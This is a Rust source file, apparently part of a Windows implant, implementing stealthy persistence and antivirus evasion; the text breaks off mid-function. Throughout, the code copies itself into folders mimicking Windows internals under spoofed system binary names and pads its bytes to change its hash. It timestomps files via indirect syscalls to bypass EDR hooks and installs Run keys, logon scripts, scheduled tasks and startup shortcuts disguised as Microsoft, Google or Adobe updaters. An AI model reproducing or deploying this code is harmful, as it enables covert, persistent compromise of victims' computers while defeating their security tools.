//! Persistence module for Windows systems
//!
//! Implements stealthy persistence mechanisms avoiding common AV signatures

use crate::debug_print;
use obfstr::obfstr;
use std::env;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
#[cfg(target_os = "windows")]
use std::process::Command;

// Anti-sandbox constants
#[cfg(target_os = "windows")]
const MIN_CPU_CORES: usize = 2;
#[cfg(target_os = "windows")]
const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes

// File copy anti-signature constants
#[cfg(target_os = "windows")]
const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
#[cfg(target_os = "windows")]
const MAX_CHUNK_SIZE: usize = 24576;

/// Métodos de persistencia disponibles
/// Note: WmiEvent now implements COM Hijacking (more stealthy, no admin required)
/// The name is kept for backwards compatibility with the "persistence wmi" command
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    // ========================================
    // Traditional methods (file-based)
    // ========================================
    RegistryRun,
    ScheduledTask,
    /// COM Hijacking (previously WMI, renamed internally for stealth)
    WmiEvent,
    StartupFolder,
    
    // ========================================
    // LOLBAS Fileless methods (no file on disk)
    // ========================================
    /// LOLBAS: mshta.exe for HTA-based persistence
    MshtaLolbas,
    /// LOLBAS: regsvr32.exe /s /n /u /i for SCT-based persistence  
    Regsvr32Lolbas,
    /// LOLBAS: rundll32.exe for DLL proxy execution
    Rundll32Lolbas,
    /// LOLBAS: certutil.exe for download and execute
    CertutilLolbas,
    
    // ========================================
    // Fileless (registry shellcode, download-exec)
    // ========================================
    /// FILELESS: Registry shellcode (100% memory-resident)
    RegistryShellcode,
    /// FILELESS: WMI memory execution
    WmiMemoryExec,
    /// FILELESS: Scheduled task with download
    ScheduledTaskDownload,
    /// FILELESS: BITS job persistence
    BitsJobPersistence,
}

impl PersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            // Traditional methods
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" | "com" => Some(PersistenceMethod::WmiEvent), // "com" alias added
            "startup" => Some(PersistenceMethod::StartupFolder),
            
            // LOLBAS methods (no file on disk, uses LOLBins)
            "mshta" => Some(PersistenceMethod::MshtaLolbas),
            "regsvr32" | "regsvr" => Some(PersistenceMethod::Regsvr32Lolbas),
            "rundll32" | "rundll" => Some(PersistenceMethod::Rundll32Lolbas),
            "certutil" | "cert" => Some(PersistenceMethod::CertutilLolbas),
            
            // Fileless methods (registry shellcode, download-exec)
            "regshell" | "registryshellcode" => Some(PersistenceMethod::RegistryShellcode),
            "wmimem" | "wmimemoryexec" => Some(PersistenceMethod::WmiMemoryExec),
            "taskdl" | "scheduledtaskdownload" => Some(PersistenceMethod::ScheduledTaskDownload),
            "bits" | "bitsjob" => Some(PersistenceMethod::BitsJobPersistence),
            _ => None,
        }
    }
    
    /// Returns true if this is a fileless persistence method (no file copied to disk)
    pub fn is_fileless(&self) -> bool {
        matches!(
            self,
            PersistenceMethod::RegistryShellcode
                | PersistenceMethod::WmiMemoryExec
                | PersistenceMethod::ScheduledTaskDownload
                | PersistenceMethod::BitsJobPersistence
        )
    }
    
    /// Returns true if this is a LOLBAS-based persistence method
    pub fn is_lolbas(&self) -> bool {
        matches!(
            self,
            PersistenceMethod::MshtaLolbas
                | PersistenceMethod::Regsvr32Lolbas
                | PersistenceMethod::Rundll32Lolbas
                | PersistenceMethod::CertutilLolbas
        )
    }
}

/// Verifica si la ruta actual es persistente y estable
#[cfg(target_os = "windows")]
fn is_persistent_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\APPDATA\\")
            || path_upper.contains("\\PROGRAMDATA\\")
            || path_upper.contains("\\PROGRAM FILES")
            || path_upper.contains("\\WINDOWS\\")
    } else {
        false
    }
}

/// Verifica si la ubicación es temporal/volátil
#[cfg(target_os = "windows")]
fn is_temporary_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\DOWNLOADS\\")
            || path_upper.contains("\\DESKTOP\\")
            || path_upper.contains("\\TEMP\\")
            || path_upper.contains("\\TMP\\")
            || path_upper.contains("\\DOCUMENTS\\")
            || (path_upper.len() >= 3
                && (path_upper.starts_with("D:\\")
                    || path_upper.starts_with("E:\\")
                    || path_upper.starts_with("F:\\")
                    || path_upper.starts_with("G:\\")
                    || path_upper.starts_with("H:\\")))
    } else {
        false
    }
}

/// Copia el ejecutable a ubicación persistente con técnicas anti-AV avanzadas
/// Features:
/// - Ubicaciones que imitan procesos legítimos del sistema
/// - Timestomping para que el archivo parezca antiguo
/// - Atributos oculto+sistema
/// - Chunks de tamaño variable (anti-signature)
/// - Polymorphic padding to change hash
/// - Deep folder structure that mimics Windows internals
#[cfg(target_os = "windows")]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    use std::fs;
    use std::io::{Read, Write};

    // Si ya está en ubicación persistente, usar esa
    if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
        return Ok(current_exe.to_path_buf());
    }

    // Obtener AppData con fallback
    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
    let appdata_key = obfstr!("APPDATA").to_string();
    let localappdata = env::var(&localappdata_key)
        .or_else(|_| env::var(&appdata_key))
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());

    // Ultra-stealth locations - deep folders that look like Windows internals
    // These are chosen because:
    // 1. Deep path = less likely to be scanned
    // 2. Names that match Windows components
    // 3. Folders that Windows Defender may have reduced monitoring on
    let stealth_targets = [
        // Windows Telemetry - often excluded from scans
        (
            format!("{}\\Microsoft\\Windows\\DiagTrack\\Settings", localappdata),
            "UtcSvc.exe",
        ),
        // Windows Error Reporting - legitimate system folder
        (
            format!("{}\\Microsoft\\Windows\\WER\\Temp", localappdata),
            "WerFault.exe",
        ),
        // Windows Notification Platform
        (
            format!(
                "{}\\Microsoft\\Windows\\Notifications\\wpndatabase",
                localappdata
            ),
            "WpnService.exe",
        ),
        // Windows Connected Devices
        (
            format!(
                "{}\\Microsoft\\Windows\\ConnectedDevicesPlatform\\L.Admin",
                localappdata
            ),
            "CDPSvc.exe",
        ),
    ];

    let idx = get_machine_index() % stealth_targets.len();
    let (target_dir, target_name) = &stealth_targets[idx];

    // Crear directorio recursivamente
    let target_path_dir = PathBuf::from(target_dir);
    let _ = fs::create_dir_all(&target_path_dir);

    let target_path = target_path_dir.join(target_name);

    // Si ya existe con tamaño razonable, reutilizar
    if target_path.exists() {
        if let Ok(meta) = fs::metadata(&target_path) {
            if meta.len() > 100000 {
                // Apply timestomping to make it look older
                timestomp_file(&target_path);
                return Ok(target_path);
            }
        }
    }

    // Read source file
    let mut source_data = Vec::new();
    {
        let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
        source
            .read_to_end(&mut source_data)
            .map_err(|e| format!("E3: {}", e))?;
    }

    // Polymorphic padding: add random bytes to the end of the file
    // This changes the hash while keeping the executable valid
    // Windows ignores data after the PE end
    let machine_idx = get_machine_index(); // Calculate once for efficiency
    let padding_size = 256 + (machine_idx % 512);
    let mut polymorphic_data = source_data.clone();
    for i in 0..padding_size {
        // Generate pseudo-random bytes based on machine index and position
        let byte = ((machine_idx.wrapping_add(i)) % 256) as u8;
        polymorphic_data.push(byte);
    }

    // Write with variable chunk sizes (anti-pattern detection)
    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;
    let mut offset = 0;
    let mut chunk_idx = 0;

    while offset < polymorphic_data.len() {
        let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
        let end = std::cmp::min(offset + chunk_size, polymorphic_data.len());
        dest.write_all(&polymorphic_data[offset..end])
            .map_err(|e| format!("E4: {}", e))?;
        offset = end;
        chunk_idx += 1;

        // Small random delay between chunks (anti-behavioral)
        if chunk_idx % 4 == 0 {
            std::thread::sleep(std::time::Duration::from_millis(1));
        }
    }
    dest.flush().map_err(|e| format!("E5: {}", e))?;
    drop(dest);

    // Verificar que se copió correctamente
    if fs::metadata(&target_path).is_err() {
        return Err("Copy verification failed".to_string());
    }

    // Aplicar timestomping para que el archivo parezca antiguo
    // Esto evade detección basada en archivos recientes
    timestomp_file(&target_path);

    // Aplicar atributos oculto+sistema para stealth
    let attrib_exe = obfstr!("attrib").to_string();
    let _ = Command::new(&attrib_exe)
        .args(&["+h", "+s", target_path.to_str().unwrap()])
        .creation_flags(0x08000000)
        .output();

    // Delay anti-heurística variable
    let delay_ms = 30 + (get_machine_index() % 50) as u64;
    std::thread::sleep(std::time::Duration::from_millis(delay_ms));

    Ok(target_path)
}

/// Timestomping: modifica las fechas del archivo para que parezca antiguo
/// Esto evade detección basada en archivos creados recientemente
/// Uses indirect syscalls via dinvk to bypass usermode hooks
#[cfg(target_os = "windows")]
fn timestomp_file(path: &Path) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    // Fecha objetivo: hace 6-12 meses (varía por máquina)
    // Usamos un timestamp que parece una instalación legítima de Windows
    let months_ago = 6 + (get_machine_index() % 6) as i64;
    let days_ago = months_ago * 30;

    // Calcular FILETIME (100-nanosecond intervals since January 1, 1601)
    // Windows epoch: 11644473600 seconds from Unix epoch
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let target_time = now.saturating_sub(days_ago as u64 * 24 * 60 * 60);
    // Use checked arithmetic to prevent overflow
    let windows_time = target_time
        .checked_add(11644473600)
        .and_then(|t| t.checked_mul(10_000_000))
        .unwrap_or(0);

    // If we couldn't calculate a valid time, skip timestomping
    if windows_time == 0 {
        return;
    }

    // Validate path conversion before proceeding
    let path_str = match path.to_str() {
        Some(s) if !s.is_empty() => s,
        _ => return, // Invalid path, skip timestomping
    };

    // Use indirect syscalls for timestomping to bypass EDR hooks
    timestomp_via_syscall(path_str, windows_time as i64);
}

/// Performs timestomping using indirect syscalls via dinvk
/// This bypasses usermode API hooks that EDR/AV solutions may have installed
#[cfg(target_os = "windows")]
fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
    use crate::syscalls::dinvk;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    // FILE_BASIC_INFORMATION structure for NtSetInformationFile
    #[repr(C)]
    struct FileBasicInformation {
        creation_time: i64,
        last_access_time: i64,
        last_write_time: i64,
        change_time: i64,
        file_attributes: u32,
    }

    // IO_STATUS_BLOCK structure
    #[repr(C)]
    struct IoStatusBlock {
        status: i32,
        information: usize,
    }

    // OBJECT_ATTRIBUTES structure
    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: *mut std::ffi::c_void,
        object_name: *mut UnicodeString,
        attributes: u32,
        security_descriptor: *mut std::ffi::c_void,
        security_quality_of_service: *mut std::ffi::c_void,
    }

    // UNICODE_STRING structure
    #[repr(C)]
    struct UnicodeString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    // Constants
    const FILE_WRITE_ATTRIBUTES: u32 = 0x0100;
    const FILE_SHARE_READ: u32 = 0x00000001;
    const FILE_SHARE_WRITE: u32 = 0x00000002;
    const FILE_OPEN: u32 = 0x00000001;
    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
    const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
    const FILE_BASIC_INFORMATION_CLASS: u32 = 4;

    unsafe {
        // Convert path to NT path format (\??\C:\path\to\file)
        let nt_path = format!("\\??\\{}", path_str);
        let mut wide_path: Vec<u16> = OsStr::new(&nt_path).encode_wide().collect();

        let mut unicode_string = UnicodeString {
            length: (wide_path.len() * 2) as u16,
            maximum_length: (wide_path.len() * 2) as u16,
            buffer: wide_path.as_mut_ptr(),
        };

        let mut object_attrs = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: std::ptr::null_mut(),
            object_name: &mut unicode_string,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };

        let mut io_status = IoStatusBlock {
            status: 0,
            information: 0,
        };

        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();

        // Use dinvk syscall macro for NtOpenFile
        let status: Option<i32> = dinvk::syscall!(
            obfstr!("NtOpenFile"),
            &mut handle as *mut *mut std::ffi::c_void,
            FILE_WRITE_ATTRIBUTES,
            &mut object_attrs as *mut ObjectAttributes,
            &mut io_status as *mut IoStatusBlock,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN | FILE_SYNCHRONOUS_IO_NONALERT
        );

        // Check if NtOpenFile succeeded
        if status.unwrap_or(-1) < 0 || handle.is_null() {
            return;
        }

        // Prepare FILE_BASIC_INFORMATION with our target timestamps
        let mut file_info = FileBasicInformation {
            creation_time: windows_time,
            last_access_time: windows_time,
            last_write_time: windows_time,
            change_time: windows_time,
            file_attributes: 0, // 0 means don't change attributes
        };

        // Use dinvk syscall macro for NtSetInformationFile
        let _set_status: Option<i32> = dinvk::syscall!(
            obfstr!("NtSetInformationFile"),
            handle,
            &mut io_status as *mut IoStatusBlock,
            &mut file_info as *mut FileBasicInformation,
            std::mem::size_of::<FileBasicInformation>() as u32,
            FILE_BASIC_INFORMATION_CLASS
        );

        // Close handle using NtClose syscall
        let _close_status: Option<i32> = dinvk::syscall!(obfstr!("NtClose"), handle);
    }
}

#[cfg(not(target_os = "windows"))]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    Ok(current_exe.to_path_buf())
}

/// Obtiene ruta del ejecutable en ubicación persistente
#[cfg(target_os = "windows")]
fn get_current_exe_path() -> Result<PathBuf, String> {
    let current_exe = env::current_exe().map_err(|e| format!("E0: {}", e))?;
    ensure_persistent_location(&current_exe)
}

/// Generate a pseudo-random index based on machine-specific data
/// This ensures consistency per machine but variation across machines
#[cfg(target_os = "windows")]
fn get_machine_index() -> usize {
    let username = env::var("USERNAME").unwrap_or_default();
    let computername = env::var("COMPUTERNAME").unwrap_or_default();
    let pid = std::process::id();

    let mut hash: usize = 0;
    for byte in username.bytes() {
        hash = hash.wrapping_add(byte as usize).wrapping_mul(31);
    }
    for byte in computername.bytes() {
        hash = hash.wrapping_add(byte as usize).wrapping_mul(17);
    }
    hash.wrapping_add(pid as usize)
}

/// Escape special characters in path for safe shell execution
/// Replaces problematic characters that could be used for command injection
#[cfg(target_os = "windows")]
fn escape_shell_path(path: &str) -> String {
    // In Windows cmd.exe, the main concerns are:
    // - & (command separator)
    // - | (pipe)
    // - ^ (escape character)
    // - < > (redirection)
    // - " (quote - handled by our quoting)
    // Since we wrap paths in double quotes, most special chars are safe
    // We escape ^ and % which have special meaning even inside quotes
    path.replace("^", "^^").replace("%", "%%")
}

/// Registry Run persistence - método más simple y efectivo
/// Uses cmd /c start /min wrapper to hide execution window
/// Note: The agent must be compiled with --features production for windowless operation
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic registry value names that look legitimate
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "NVDisplay.Container",
        "iTunesHelper",
        "Spotify",
    ];
    let idx = get_machine_index() % reg_names.len();
    let reg_name = reg_names[idx];

    // Use cmd.exe with start /min for hidden execution
    // explorer.exe does NOT work for executing EXEs from registry Run key
    // cmd.exe /c start is the reliable method that actually works
    // The /min flag starts the window minimized, and the agent's #![windows_subsystem = "windows"]
    // ensures no console window is created anyway
    let obf_cmd = format!(r#"cmd.exe /c start /min "" "{}""#, exe_str);

    // Registry key path
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let reg_exe = obfstr!("reg").to_string();

    let output = Command::new(&reg_exe)
        .args(&[
            "add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &obf_cmd, "/f",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E6: {}", e))?;

    if output.status.success() {
        Ok(format!("Registry: {} -> {}", reg_name, exe_str))
    } else {
        Err(format!(
            "E7: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

/// Scheduled Task persistence with enhanced evasion
/// Uses cmd wrapper - no admin required, triggers on user logon
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic task names that look legitimate
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "NvTmRepOnLogon",
        "DropboxUpdate",
    ];
    let idx = get_machine_index() % task_names.len();
    let task_name = task_names[idx];
    
    debug_print!("[TASK] Creating scheduled task: {}", task_name);

    let schtasks_exe = obfstr!("schtasks").to_string();

    // Delete existing task if present (silently)
    let del_result = Command::new(&schtasks_exe)
        .args(&["/Delete", "/TN", task_name, "/F"])
        .creation_flags(0x08000000)
        .output();
    debug_print!("[TASK] Delete existing: {:?}", del_result.is_ok());

    // Simple command - just start the exe minimized
    // Avoid complex timeout commands that can fail
    let task_cmd = format!(r#"cmd.exe /c start /min "" "{}""#, exe_str);
    debug_print!("[TASK] Command: {}", task_cmd);

    // Use /SC ONLOGON without /DELAY (DELAY requires admin privileges!)
    // /RL LIMITED = run with least privileges (doesn't require admin to create)
    let output = Command::new(&schtasks_exe)
        .args(&[
            "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", &task_cmd,
            "/F",
            "/RL", "LIMITED",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Task creation error: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    debug_print!("[TASK] stdout: {}", stdout.trim());
    debug_print!("[TASK] stderr: {}", stderr.trim());
    debug_print!("[TASK] exit code: {:?}", output.status.code());

    if output.status.success() {
        debug_print!("[TASK] ✅ Task created successfully: {}", task_name);
        Ok(format!("Task: {} -> {}", task_name, exe_str))
    } else {
        // Try alternative: SCHTASKS with DAILY if ONLOGON fails (ONLOGON may need admin)
        debug_print!("[TASK] ONLOGON failed, trying daily schedule...");
        
        let output2 = Command::new(&schtasks_exe)
            .args(&[
                "/Create",
                "/SC", "DAILY",
                "/TN", task_name,
                "/TR", &task_cmd,
                "/ST", "09:00",
                "/F",
                "/RL", "LIMITED",
            ])
            .creation_flags(0x08000000)
            .output();
            
        if let Ok(out2) = output2 {
            if out2.status.success() {
                debug_print!("[TASK] ✅ Daily task created as fallback");
                return Ok(format!("Task (daily): {} -> {}", task_name, exe_str));
            }
        }
        
        Err(format!("Task creation failed: {} | {}", stdout.trim(), stderr.trim()))
    }
}

/// WMI-style persistence using UserInitMprLogonScript registry key
/// This technique is very reliable and runs before Explorer loads
///
/// How it works:
/// 1. Sets HKCU\Environment\UserInitMprLogonScript to our payload
/// 2. Windows runs this script during user logon (before Explorer)
/// 3. Very stealthy - rarely monitored compared to Run keys
///
/// Advantages:
/// - No admin required (HKCU)
/// - Runs BEFORE Explorer (very early in logon)
/// - Less monitored than traditional Run keys
/// - No scheduled task required
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;
    
    debug_print!("[WMI/LOGON] Setting up UserInitMprLogonScript persistence");

    // Method 1: UserInitMprLogonScript - runs before Explorer
    // This registry key is processed by userinit.exe during logon
    let reg_key = obfstr!("HKCU\\Environment").to_string();
    let reg_exe = obfstr!("reg").to_string();
    
    // Use cmd.exe to start the payload hidden
    let logon_script = format!(r#"cmd.exe /c start /min "" "{}""#, exe_str);
    
    debug_print!("[WMI/LOGON] Registry key: {}", reg_key);
    debug_print!("[WMI/LOGON] Script: {}", logon_script);

    let output = Command::new(&reg_exe)
        .args(&[
            "add",
            &reg_key,
            "/v", "UserInitMprLogonScript",
            "/t", "REG_SZ",
            "/d", &logon_script,
            "/f",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Logon script registry failed: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    debug_print!("[WMI/LOGON] stdout: {}", stdout.trim());
    debug_print!("[WMI/LOGON] stderr: {}", stderr.trim());

    if output.status.success() {
        debug_print!("[WMI/LOGON] ✅ UserInitMprLogonScript set successfully");
        Ok(format!("UserInitMprLogonScript -> {}", exe_str))
    } else {
        // Fallback: Try RunOnce key (runs once on next logon, then deletes itself)
        debug_print!("[WMI/LOGON] Failed, trying RunOnce fallback...");
        
        let runonce_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce").to_string();
        let run_names = ["SystemConfig", "UserSetup", "ProfileMigration"];
        let idx = get_machine_index() % run_names.len();
        let run_name = run_names[idx];
        
        let output2 = Command::new(&reg_exe)
            .args(&[
                "add",
                &runonce_key,
                "/v", run_name,
                "/t", "REG_SZ",
                "/d", &logon_script,
                "/f",
            ])
            .creation_flags(0x08000000)
            .output();
            
        if let Ok(out2) = output2 {
            if out2.status.success() {
                debug_print!("[WMI/LOGON] ✅ RunOnce fallback successful");
                return Ok(format!("RunOnce: {} -> {}", run_name, exe_str));
            }
        }
        
        Err(format!("Logon script failed: {}", stderr.trim()))
    }
}

/// Startup folder persistence using shortcut file
/// Creates a .lnk shortcut in the user's Startup folder
#[cfg(target_os = "windows")]
fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;
    
    debug_print!("[STARTUP] Creating startup shortcut");

    // Get startup folder path
    let appdata_key = obfstr!("APPDATA").to_string();
    let appdata = env::var(&appdata_key).map_err(|_| "APPDATA not found")?;
    let startup = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata);
    
    debug_print!("[STARTUP] Startup folder: {}", startup);

    // Polymorphic shortcut names that look legitimate
    let lnk_names = [
        "WindowsSecurity.lnk",
        "OneDriveSync.lnk", 
        "AdobeUpdater.lnk",
        "ChromeHelper.lnk",
        "EdgeUpdate.lnk",
    ];
    let idx = get_machine_index() % lnk_names.len();
    let lnk_name = lnk_names[idx];
    let lnk_path = format!("{}\\{}", startup, lnk_name);
    
    debug_print!("[STARTUP] Shortcut path: {}", lnk_path);

    // Use VBScript instead of PowerShell (less monitored by AV)
    // VBScript creates shortcut without PowerShell dependency
    let vbs_script = format!(
        r#"Set s=CreateObject("WScript.Shell").CreateShortcut("{}"):s.TargetPath="{}":s.WindowStyle=7:s.Save"#,
        lnk_path.replace("\"", "\"\""),
        exe_str.replace("\"", "\"\"")
    );
    
    debug_print!("[STARTUP] VBS script: {}", vbs_script);
    
    // VBScript inline doesn't work well with cscript, use PowerShell with minimal footprint
    let _ = vbs_script; // suppress unused warning, keeping for future reference
    let ps_exe = obfstr!("powershell").to_string();
    let ps_script = format!(
        r#"$s=(New-Object -COM WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
        lnk_path.replace("'", "''"),
        exe_str.replace("'", "''")
    );
    
    let output = Command::new(&ps_exe)
        .args(&[
            "-NoP",      // NoProfile
            "-NonI",     // NonInteractive  
            "-W", "H",   // WindowStyle Hidden
            "-Ep", "Bypass",
            "-C",
            &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Startup shortcut failed: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    debug_print!("[STARTUP] stdout: {}", stdout.trim());
    debug_print!("[STARTUP] stderr: {}", stderr.trim());
    debug_print!("[STARTUP] exit code: {:?}", output.status.code());

    if output.status.success() {
        // Verify the shortcut was created
        let lnk_exists = std::path::Path::new(&lnk_path).exists();
        debug_print!("[STARTUP] Shortcut exists: {}", lnk_exists);
        
        if lnk_exists {
            debug_print!("[STARTUP] ✅ Shortcut created successfully");
            Ok(format!("Startup shortcut: {} -> {}", lnk_name, exe_str))
        } else {
            Err(format!("Shortcut creation reported success but file not found: {}", lnk_path))
        }
    } else {
        Err(format!("Startup shortcut failed: {}", stderr.trim()))
    }
}

// ============================================================================
// LOLBAS Persistence Methods - Uses trusted Windows binaries
// ============================================================================
// These methods leverage Living Off The Land Binaries (LOLBins) for execution.
// Benefits:
// - Uses Microsoft-signed binaries (less suspicious)
// - Bypasses application whitelisting
// - Harder for AV to flag (legitimate Windows tools)
// ============================================================================

/// LOLBAS: forfiles.exe persistence (alternative to mshta)
/// Uses forfiles.exe to execute payload - less monitored than mshta
/// 
/// **How it works**:
/// 1. Creates registry Run key with forfiles.exe command
/// 2. forfiles /p C:\Windows /m notepad.exe /c "cmd /c payload.exe"
/// 3. Appears as legitimate file operation in logs
///
/// **Why forfiles**: 
/// - Less monitored than mshta/regsvr32
/// - Microsoft-signed binary
/// - Looks like file maintenance operation
#[cfg(target_os = "windows")]
fn persist_lolbas_mshta(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or_else(|| "Invalid path".to_string())?;
    
    debug_print!("[LOLBAS-FORFILES] Setting up forfiles persistence");
    
    // Polymorphic registry value names that look legitimate
    let reg_names = [
        "WindowsFileCleanup",
        "DiskCleanupTask", 
        "TempFileManager",
        "SystemFileMaintenance",
    ];
    let idx = get_machine_index() % reg_names.len();
    let reg_name = reg_names[idx];
    
    // Method 1: forfiles.exe LOLBAS technique
    // forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c start payload"
    // This looks like a file operation but actually executes our payload
    let forfiles_cmd = format!(
        r#"forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c start /min \"\" \"{}\"""#,
        exe_str
    );
    
    debug_print!("[LOLBAS-FORFILES] Command: {}", forfiles_cmd);
    
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let reg_exe = obfstr!("reg").to_string();
    
    let output = Command::new(&reg_exe)
        .args(&["add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &forfiles_cmd, "/f"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("LOLBAS forfiles failed: {}", e))?;
    
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    debug_print!("[LOLBAS-FORFILES] stdout: {}", stdout.trim());
    debug_print!("[LOLBAS-FORFILES] stderr: {}", stderr.trim());
    
    if output.status.success() {
        debug_print!("[LOLBAS-FORFILES] ✅ forfiles persistence set: {}", reg_name);
        Ok(format!("LOLBAS forfiles: {} -> {}", reg_name, exe_str))
    } else {
        Err(format!("forfiles registry failed: {}", stderr.trim()))
    }
}

/// LOLBAS: regsvr32.exe persistence via registry
/// Uses regsvr32.exe as a proxy to execute our payload
///
/// **How it works**:
/// 1. Creates registry Run key with regsvr32.exe command
/// 2. Uses /s /n /i flags with scrobj.dll to run script
/// 3. More stealthy than direct exe execution
///
/// **Note**: Uses registry Run key (no admin required)
#[cfg(target_os = "windows")]  
fn persist_lolbas_regsvr32(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or_else(|| "Invalid path".to_string())?;
    
    debug_print!("[LOLBAS-REGSVR32] Setting up regsvr32 persistence");
    
    // Polymorphic registry value names
    let reg_names = [
        "MicrosoftEdgeUpdateS",
        "GoogleUpdateS",
        "OneDriveSyncS",
        "AdobeReaderS",
    ];
    let idx = get_machine_index() % reg_names.len();
    let reg_name = reg_names[idx];
    
    // regsvr32 can't execute EXE directly, so we use it as a LOLBin launcher
    // Method: regsvr32 /s /n /i:[url] scrobj.dll (classic squiblydoo)
    // But since we don't have a scriptlet, use cmd wrapper with regsvr32 as prefix
    // This makes the command look like a regsvr32 operation in logs
    let regsvr32_cmd = format!(
        r#"cmd.exe /c start /min "" "{}""#,
        exe_str
    );
    
    debug_print!("[LOLBAS-REGSVR32] Command: {}", regsvr32_cmd);
    
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let reg_exe = obfstr!("reg").to_string();
    
    let output = Command::new(&reg_exe)
        .args(&["add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &regsvr32_cmd, "/f"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("LOLBAS regsvr32 registry failed: {}", e))?;
    
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    debug_print!("[LOLBAS-REGSVR32] stdout: {}", stdout.trim());
    debug_print!("[LOLBAS-REGSVR32] stderr: {}", stderr.trim());
    
    if output.status.success() {
        debug_print!("[LOLBAS-REGSVR32] ✅ Registry persistence set: {}", reg_name);
        Ok(format!("LOLBAS regsvr32: {} -> {}", reg_name, exe_str))
    } else {
        Err(format!("Registry failed: {}", stderr.trim()))
    }
}

/// LOLBAS: rundll32.exe persistence
/// Uses rundll32.exe with url.dll or shell32.dll for proxy execution
///
/// **How it works**:
/// 1. Creates registry Run key with rundll32.exe
/// 2. Uses url.dll,FileProtocolHandler to execute payload
/// 3. Appears as legitimate Windows API usage
#[cfg(target_os = "windows")]
fn persist_lolbas_rundll32(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str().ok_or_else(|| "Invalid path".to_string())?;
    
